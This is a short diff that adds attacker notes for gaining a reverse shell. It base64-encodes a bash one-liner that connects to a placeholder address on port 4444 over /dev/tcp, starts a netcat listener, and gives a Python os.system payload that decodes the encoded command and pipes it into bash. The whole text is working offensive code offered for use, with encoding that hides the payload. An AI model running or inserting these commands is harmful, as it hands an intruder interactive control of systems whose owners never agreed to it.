@@ -1,0 +1,4 @@
+echo 'bash -c "bash -i >& /dev/tcp/<local ipv4>/4444 0>&1"' | base64
+nc -lvnp 4444
+python reverse shell:
+__import__("os").system("echo <output of base64 encoding> | base64 -d | bash")
